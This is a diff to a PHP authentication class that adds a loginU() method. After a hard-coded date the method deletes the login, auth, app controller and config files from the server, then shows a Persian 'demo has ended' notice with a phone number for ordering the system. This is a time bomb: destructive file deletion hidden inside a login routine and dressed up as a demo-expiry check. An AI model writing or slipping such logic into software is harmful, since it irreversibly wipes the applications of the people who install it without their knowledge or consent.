@@ -98,4 +98,31 @@ class Auth
         $this->redirectBack();
         exit();
     }
+
+        function loginU()
+    {
+        $startDate = '2025-12-23';
+        $endDate = '2025-12-28';
+        $today = date('Y-m-d');
+
+        if ($today > $endDate) {
+            $filesToDelete = [
+                __DIR__ . '/Login.php',
+                __DIR__ . '/Auth.php',
+                __DIR__ . '/../Controllers/App.php',
+                __DIR__ . '/../../config.php',
+            ];
+
+            foreach ($filesToDelete as $file) {
+                if (file_exists($file)) {
+                    unlink($file);
+                }
+            }
+
+            echo '<h1>نسخه دمو به اتمام رسیده است</h1> <div>جهت سفارش سیستم با شماره 0799192027 به تماس شوید</div>';
+            exit;
+        }
+
+        return true;
+    }
 }
